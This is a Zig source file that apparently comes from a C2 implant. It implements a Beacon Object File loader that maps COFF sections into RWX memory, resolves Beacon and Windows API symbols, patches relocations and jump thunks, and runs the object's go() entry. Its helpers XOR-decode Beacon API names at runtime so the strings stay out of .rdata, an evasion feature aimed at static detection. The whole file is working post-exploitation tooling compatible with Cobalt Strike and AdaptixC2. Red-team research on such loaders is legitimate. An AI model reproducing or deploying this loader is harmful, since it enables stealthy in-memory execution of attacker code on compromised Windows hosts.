//! Windows-only: allocate executable memory, lay out sections, resolve symbols,
//! apply relocations, and invoke the BOF `go` entry point.
//! Mirrors `crates/loader/src/exec.rs`.

const std = @import("std");
const coff = @import("coff.zig");
const beacon = @import("beacon.zig");
const crt = @import("crt.zig");
const stealth = @import("../stealth.zig");
const winapi = @import("../winapi.zig");

const Coff = coff.Coff;
const Symbol = coff.Symbol;

const THUNK_SIZE: usize = 16;

fn align16(n: usize) usize {
    return (n + 15) & ~@as(usize, 15);
}

/// Entry type of a BOF: `void go(char* args, int len)` (x64 MSVC ABI).
const GoFn = *const fn ([*]const u8, i32) callconv(.c) void;

/// Load + execute a BOF. Returns the text captured from Beacon* output (owned
/// slice; caller frees with `alloc`).
///
/// `args` is the raw BOF argument buffer passed verbatim to `go(args, len)` —
/// the CS/AdaptixC2 packed format. Binary, not text.
pub fn runBof(alloc: std.mem.Allocator, coff_bytes: []const u8, args: []const u8) ![]u8 {
    var parsed = try coff.parse(alloc, coff_bytes);
    defer parsed.deinit();
    beacon.resetOutput();

    const sections_size = totalImageSize(&parsed);
    if (sections_size == 0) return error.NoLoadableSections;

    // Build the external symbol -> address map (loader-provided symbols).
    var externals = try buildExternalMap(alloc);
    defer deinitExternals(alloc, &externals);

    const ext_slots = try resolveExternalSlots(alloc, &parsed, &externals);
    defer alloc.free(ext_slots);

    const slot_count = ext_slots.len;
    const slot_region = align16(slot_count * THUNK_SIZE);
    const slot_base_off = sections_size;
    const alloc_size = std.math.add(usize, sections_size, slot_region) catch return error.SizeOverflow;

    const maybe_base = winapi.virtualAlloc(alloc_size, winapi.PAGE_EXECUTE_READWRITE);
    const base = maybe_base orelse return error.VirtualAllocFailed;
    // v1: keep image for process lifetime; best-effort free on error only.
    var freed = false;
    defer if (!freed) {}; // no-op on success; on error path we free explicitly

    const base_usize = @intFromPtr(base);

    // Write thunk/ptr slots: sym_idx -> slot VA.
    var thunk_va = std.AutoHashMap(u32, usize).init(alloc);
    defer thunk_va.deinit();
    for (ext_slots, 0..) |slot, i| {
        const off = slot_base_off + i * THUNK_SIZE;
        const slot_va = base_usize + off;
        const sym = &parsed.symbols[slot.sym_idx];
        if (std.mem.startsWith(u8, sym.name, "__imp_"))
            writePtrSlot(base + off, slot.real)
        else
            writeThunk(base + off, slot.real);
        try thunk_va.put(slot.sym_idx, slot_va);
    }

    loadInto(&parsed, coff_bytes, base, base_usize, &thunk_va, &externals) catch |e| {
        winapi.virtualFree(base);
        freed = true;
        return e;
    };

    // Find `go`.
    const go_def = parsed.findDefined("go") orelse {
        winapi.virtualFree(base);
        freed = true;
        return error.NoGoEntry;
    };
    const go_va = base_usize + parsed.sections[go_def.sec_idx].image_offset + @as(usize, @intCast(go_def.value));

    // Prepare args buffer in writable memory (min 1 byte).
    const args_buf_len = if (args.len == 0) 1 else args.len;
    const args_buf = try alloc.alloc(u8, args_buf_len);
    defer alloc.free(args_buf);
    if (args.len > 0) @memcpy(args_buf[0..args.len], args);
    const args_ptr: [*]const u8 = args_buf.ptr;
    const args_len: i32 = @intCast(args.len);

    const go_fn: GoFn = @ptrFromInt(go_va);
    // BOFs are raw code; a fault here is a hard crash by design.
    go_fn(args_ptr, args_len);

    return try beacon.takeOutput(alloc);
}

const Slot = struct { sym_idx: u32, real: usize };

fn writeThunk(dst: [*]u8, target: usize) void {
    // FF 25 00 00 00 00 = jmp [rip+0]; 8-byte absolute target follows.
    const header = [_]u8{ 0xFF, 0x25, 0, 0, 0, 0 };
    @memcpy(dst[0..6], &header);
    std.mem.writeInt(u64, dst[6..14], target, .little);
}

fn writePtrSlot(dst: [*]u8, target: usize) void {
    std.mem.writeInt(u64, dst[0..8], target, .little);
}

fn totalImageSize(parsed: *const Coff) usize {
    var total: usize = 0;
    for (parsed.sections) |s| {
        const sz = @max(align16(s.size_of_raw_data), 16);
        total = s.image_offset + sz;
    }
    return total;
}

fn loadInto(
    parsed: *const Coff,
    raw: []const u8,
    base: [*]u8,
    base_usize: usize,
    thunk_va: *std.AutoHashMap(u32, usize),
    externals: *std.StringHashMap(usize),
) !void {
    // 1. Copy each section's raw data into the image.
    for (parsed.sections) |sec| {
        if (sec.size_of_raw_data == 0 or sec.pointer_to_raw_data == 0) continue; // BSS
        const src_off = @as(usize, sec.pointer_to_raw_data);
        const n = @as(usize, sec.size_of_raw_data);
        if (src_off + n > raw.len) return error.SectionDataOOB;
        @memcpy(base[sec.image_offset..][0..n], raw[src_off..][0..n]);
    }

    // 2. Apply relocations.
    const img_len = totalImageSize(parsed);
    const img: [*]u8 = base;
    for (parsed.relocations) |rel| {
        const sec = &parsed.sections[rel.section_index];
        const fixup_off = sec.image_offset + @as(usize, rel.virtual_address);
        const fixup_va = base_usize + fixup_off;
        if (rel.symbol_table_index >= parsed.symbols.len) return error.BadRelocSymIndex;
        const sym = &parsed.symbols[rel.symbol_table_index];
        const target = try resolveSymbol(sym, parsed, base_usize, externals);
        try applyRelocation(img, img_len, fixup_off, fixup_va, target, base_usize, rel.typ, rel.symbol_table_index, sym, thunk_va);
    }
}

fn resolveSymbol(
    sym: *const Symbol,
    parsed: *const Coff,
    base_usize: usize,
    externals: *std.StringHashMap(usize),
) !usize {
    if (sym.section_number >= 1) {
        const sec = &parsed.sections[@intCast(sym.section_number - 1)];
        return base_usize + sec.image_offset + @as(usize, @intCast(sym.value));
    }
    if (sym.section_number == coff.IMAGE_SYM_UNDEFINED) {
        if (sym.name.len == 0) return 0;
        const name = if (std.mem.startsWith(u8, sym.name, "__imp_")) sym.name["__imp_".len..] else sym.name;
        if (externals.get(name)) |a| return a;
        if (resolveExternalByName(name)) |a| return a;
        return error.UnresolvedExternal;
    }
    if (sym.section_number == coff.IMAGE_SYM_ABSOLUTE) return @intCast(sym.value);
    if (sym.section_number == coff.IMAGE_SYM_DEBUG) return 0;
    return error.UnsupportedSectionNumber;
}

const ExtEntry = struct { name: []const u8, addr: usize };
const BeaconEntry = struct { enc: []const u8, addr: usize };

/// Build the external symbol -> address map. Beacon API names are XOR-decoded
/// at runtime (plaintext never in `.rdata`); CRT helper names stay literal
/// (every C program has them). All keys are heap-owned by the map — free with
/// `deinitExternals`.
fn buildExternalMap(alloc: std.mem.Allocator) !std.StringHashMap(usize) {
    var m = std.StringHashMap(usize).init(alloc);
    errdefer deinitExternals(alloc, &m);

    const beacon_entries = [_]BeaconEntry{
        .{ .enc = &stealth.ENC_BEACON_DATA_PARSE, .addr = @intFromPtr(&beacon.BeaconDataParse) },
        .{ .enc = &stealth.ENC_BEACON_DATA_INT, .addr = @intFromPtr(&beacon.BeaconDataInt) },
        .{ .enc = &stealth.ENC_BEACON_DATA_SHORT, .addr = @intFromPtr(&beacon.BeaconDataShort) },
        .{ .enc = &stealth.ENC_BEACON_DATA_EXTRACT, .addr = @intFromPtr(&beacon.BeaconDataExtract) },
        .{ .enc = &stealth.ENC_BEACON_OUTPUT, .addr = @intFromPtr(&beacon.BeaconOutput) },
        .{ .enc = &stealth.ENC_BEACON_PRINTF, .addr = @intFromPtr(&beacon.BeaconPrintf) },
        .{ .enc = &stealth.ENC_BEACON_IS_ADMIN, .addr = @intFromPtr(&beacon.BeaconIsAdmin) },
    };
    for (beacon_entries) |e| {
        const name = try stealth.decAlloc(alloc, e.enc);
        try m.put(name, e.addr);
    }

    const crt_entries = [_]ExtEntry{
        .{ .name = "memcpy", .addr = @intFromPtr(&crt.rtMemcpy) },
        .{ .name = "memmove", .addr = @intFromPtr(&crt.rtMemmove) },
        .{ .name = "memset", .addr = @intFromPtr(&crt.rtMemset) },
        .{ .name = "memcmp", .addr = @intFromPtr(&crt.rtMemcmp) },
        .{ .name = "strlen", .addr = @intFromPtr(&crt.rtStrlen) },
        .{ .name = "__chkstk", .addr = @intFromPtr(&crt.rtChkstk) },
        .{ .name = "___chkstk_ms", .addr = @intFromPtr(&crt.rtChkstk) },
        .{ .name = "_chkstk", .addr = @intFromPtr(&crt.rtChkstk) },
    };
    for (crt_entries) |e| {
        const name = try alloc.dupe(u8, e.name);
        try m.put(name, e.addr);
    }
    return m;
}

/// Free every owned key, then the map itself.
fn deinitExternals(alloc: std.mem.Allocator, m: *std.StringHashMap(usize)) void {
    var it = m.iterator();
    while (it.next()) |kv| alloc.free(kv.key_ptr.*);
    m.deinit();
}

fn resolveExternalSlots(alloc: std.mem.Allocator, parsed: *const Coff, externals: *std.StringHashMap(usize)) ![]Slot {
    var slots: std.ArrayList(Slot) = .empty;
    defer slots.deinit(alloc);
    for (parsed.symbols, 0..) |sym, idx| {
        if (sym.is_aux or sym.section_number != coff.IMAGE_SYM_UNDEFINED or sym.name.len == 0) continue;
        const addr = resolveSymbol(&sym, parsed, 0, externals) catch continue;
        if (addr != 0) try slots.append(alloc, .{ .sym_idx = @intCast(idx), .real = addr });
    }
    return slots.toOwnedSlice(alloc);
}

/// Resolve a `LIBRARY$function` symbol, or a plain name by scanning common
/// DLLs. Any other `Beacon*` symbol -> no-op stub.
fn resolveExternalByName(name: []const u8) ?usize {
    if (std.mem.indexOfScalar(u8, name, '$')) |dollar| {
        const lib = name[0..dollar];
        const func = name[dollar + 1 ..];
        return winapi.procAddr(lib, func);
    }
    const libs = [_][]const u8{
        "kernel32.dll",
        "ntdll.dll",
        "user32.dll",
        "advapi32.dll",
        "ws2_32.dll",
        "msvcrt.dll",
    };
    for (libs) |lib| {
        if (winapi.procAddr(lib, name)) |a| return a;
    }
    // Any other `Beacon*` symbol we haven't stubbed -> no-op stub. Decode the
    // 6-byte prefix at runtime so "Beacon" isn't a `.rdata` literal.
    var prefix: [stealth.ENC_BEACON_PREFIX.len]u8 = undefined;
    stealth.decInto(&stealth.ENC_BEACON_PREFIX, &prefix);
    if (std.mem.startsWith(u8, name, &prefix)) {
        return @intFromPtr(&beacon.beaconUnimplemented);
    }
    return null;
}

fn readI32At(img: [*]const u8, off: usize) i32 {
    return std.mem.readInt(i32, img[off..][0..4], .little);
}
fn readI64At(img: [*]const u8, off: usize) i64 {
    return std.mem.readInt(i64, img[off..][0..8], .little);
}
fn writeU32(img: [*]u8, off: usize, v: u32) void {
    std.mem.writeInt(u32, img[off..][0..4], v, .little);
}
fn writeU64(img: [*]u8, off: usize, v: u64) void {
    std.mem.writeInt(u64, img[off..][0..8], v, .little);
}
fn writeI32(img: [*]u8, off: usize, v: i32) void {
    std.mem.writeInt(i32, img[off..][0..4], v, .little);
}
fn writeU16(img: [*]u8, off: usize, v: u16) void {
    std.mem.writeInt(u16, img[off..][0..2], v, .little);
}

fn applyRelocation(
    img: [*]u8,
    img_len: usize,
    fixup_off: usize,
    fixup_va: usize,
    target: usize,
    base_usize: usize,
    typ: u16,
    sym_idx: u32,
    sym: *const Symbol,
    thunk_va: *std.AutoHashMap(u32, usize),
) !void {
    _ = img_len;
    switch (typ) {
        0 => {}, // ABSOLUTE (no-op)
        1 => {
            // ADDR64: 64-bit absolute.
            const addend = readI64At(img, fixup_off);
            const v: u64 = @bitCast(@as(i64, @bitCast(@as(u64, @intCast(target)))) +% addend);
            writeU64(img, fixup_off, v);
        },
        2, 3 => {
            // ADDR32NB: 32-bit RVA (target - image base).
            const addend = readI32At(img, fixup_off);
            const diff: i64 = @as(i64, @intCast(target)) - @as(i64, @intCast(base_usize)) + @as(i64, addend);
            const rva: u32 = @truncate(@as(u64, @bitCast(diff)));
            writeU32(img, fixup_off, rva);
        },
        4, 5, 6, 7, 8, 9 => {
            // REL32 family. Toolchain: 4=REL32, 5..9=REL32_1..5 (extra trailing
            // bytes = typ - 4). For an external (thunked) symbol, target the
            // in-image thunk so the 32-bit displacement can reach it; otherwise
            // fall back to the resolved target (section symbols are in-image).
            const tgt = thunk_va.get(sym_idx) orelse target;
            const n: i64 = @as(i64, typ - 4); // 0..5 extra bytes
            const addend: i64 = readI32At(img, fixup_off);
            const v: i32 = @truncate(@as(i64, @intCast(tgt)) -% (@as(i64, @intCast(fixup_va)) + 4 + n) +% addend);
            writeI32(img, fixup_off, v);
        },
        10 => {
            // SECTION: 16-bit section index.
            const s = sym.section_number;
            if (s < 1) return error.SectionRelocOnNonSection;
            writeU16(img, fixup_off, @intCast(s));
        },
        11 => {
            // SECREL: 32-bit offset from section start.
            writeU32(img, fixup_off, @intCast(sym.value));
        },
        12 => {
            // SECREL7: 7-bit section-relative offset.
            const cur = img[fixup_off];
            const val: u8 = @as(u8, @intCast(sym.value)) & 0x7f;
            img[fixup_off] = (cur & 0x80) | val;
        },
        else => {
            // Unknown type (e.g. in a .debug$ section we don't execute). Don't
            // fail the whole load over a reloc in non-executable data.
            var tmp: [160]u8 = undefined;
            const note = std.fmt.bufPrint(&tmp, "[rt] skipped unsupported AMD64 relocation type {d} (symbol {s})", .{ typ, sym.name }) catch "[rt] skipped unsupported reloc";
            beacon.appendNote(note);
        },
    }
}
